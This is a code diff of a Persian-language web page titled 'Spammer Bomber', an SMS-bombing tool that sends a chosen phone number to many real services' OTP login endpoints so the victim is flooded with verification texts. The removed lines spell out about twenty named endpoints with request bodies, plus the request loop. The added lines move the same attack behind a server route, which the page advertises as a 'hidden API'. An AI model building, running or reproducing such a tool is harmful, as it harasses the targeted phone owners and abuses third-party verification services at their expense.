@@ -153,7 +153,7 @@
         <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         
         <h1>💣 اسپمر بمبر</h1>
-        <p class="sub">🔥 سه حالته | همه عملیات موفق ✅</p>
+        <p class="sub">🔥 سه حالته | PHP امن | API مخفی</p>
 
         <div class="status" id="statusSending">⏳ در حال ارسال...</div>
         <div class="status" id="statusDone">✅ ارسال با موفقیت به اتمام رسید!</div>
@@ -223,29 +223,6 @@
             btn.classList.add('active');
         }
 
-        const allServices = [
-            { name: 'دیوار', url: 'https://api.divar.ir/v5/auth/authenticate', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'اسنپ', url: 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', body: p => 'cellphone=' + p, headers: {} },
-            { name: 'آزکی', url: 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json', 'deviceid': '6' } },
-            { name: 'تپسی', url: 'https://api.tapsi.ir/api/v2.2/user', body: p => JSON.stringify({ credential: { phoneNumber: p, role: 'PASSENGER' }, otpOption: 'SMS' }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'اوستاکار', url: 'https://api.ostadkr.com/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'بانی مد', url: 'https://mobapi.banimode.com/api/v2/auth/request', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'طاقچه', url: 'https://gw.taaghche.com/v4/site/auth/login', body: p => JSON.stringify({ contact: p, forceOtp: false }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'جاباما', url: 'https://taraazws.jabama.com/api/v4/account/send-code', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'علی بابا', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'شهرفرش', url: 'https://shahrfarsh.com/Account/Login', body: p => 'phoneNumber=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
-            { name: 'قبضینو', url: 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', body: p => JSON.stringify({ Parameters: { MobileNumber: p } }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'واندار', url: 'https://api.vandar.io/account/v1/check/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'پینورست', url: 'https://api.pinorest.com/frontend/auth/login/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'تترلند', url: 'https://service.tetherland.com/api/v5/login-register', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'دکتردکتر', url: 'https://drdr.ir/api/v3/auth/login/mobile/init', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json', 'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054' } },
-            { name: 'کلاسینو', url: 'https://student.classino.com/otp/v1/api/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'موبیت', url: 'https://api.mobit.ir/api/web/v8/register/register', body: p => JSON.stringify({ number: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'کمدا', url: 'https://api.komodaa.com/api/v2.6/loginRC/request', body: p => JSON.stringify({ phone_number: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'برق من', url: 'https://uiapi2.saapa.ir/api/otp/sendCode', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
-            { name: 'نوبت دِه', url: 'https://nobat.ir/api/public/patient/login/phone', body: p => 'mobile=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-        ];
-
         async function startBomb() {
             const phone = document.getElementById('phone').value;
             const logBox = document.getElementById('logBox');
@@ -258,7 +235,6 @@
                 return;
             }
 
-            const services = allServices.slice(0, selectedMode);
             document.getElementById('statusSending').className = 'status sending';
             sendBtn.disabled = true;
             sendBtn.textContent = '⏳ در حال ارسال...';
@@ -267,17 +243,25 @@
             const now = new Date().toLocaleTimeString('fa-IR');
             logBox.value += `[${now}] 🚀 شروع اسپمر بمبر\n📱 ${phone} | ⚡ ${selectedMode} سرویس\n━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-            for (let i = 0; i < services.length; i++) {
-                const s = services[i];
-                const time = new Date().toLocaleTimeString('fa-IR');
-                try { await fetch(s.url, { method: 'POST', headers: s.headers, body: s.body(phone) }); } catch(e) {}
-                logBox.value += `[${time}] ✅ ${i+1}. ${s.name}\n`;
-                logBox.scrollTop = logBox.scrollHeight;
-                await new Promise(r => setTimeout(r, 600));
+            try {
+                const resp = await fetch('/api/send-sms', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone, mode: selectedMode })
+                });
+                const data = await resp.json();
+                
+                if (data.results) {
+                    data.results.forEach((r, i) => {
+                        const time = new Date().toLocaleTimeString('fa-IR');
+                        logBox.value += `[${time}] ✅ ${i+1}. ${r.name}\n`;
+                    });
+                    logBox.value += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+                    logBox.value += `[${new Date().toLocaleTimeString('fa-IR')}] ✅ اتمام! ${data.total} سرویس ارسال شد\n`;
+                }
+            } catch(e) {
+                logBox.value += `⚠️ خطا در ارتباط با سرور\n`;
             }
-
-            const endTime = new Date().toLocaleTimeString('fa-IR');
-            logBox.value += `\n━━━━━━━━━━━━━━━━━━━━\n[${endTime}] ✅ اتمام! ${services.length} سرویس ارسال شد\n`;
 
             document.getElementById('statusSending').className = 'status';
             document.getElementById('statusDone').className = 'status done';
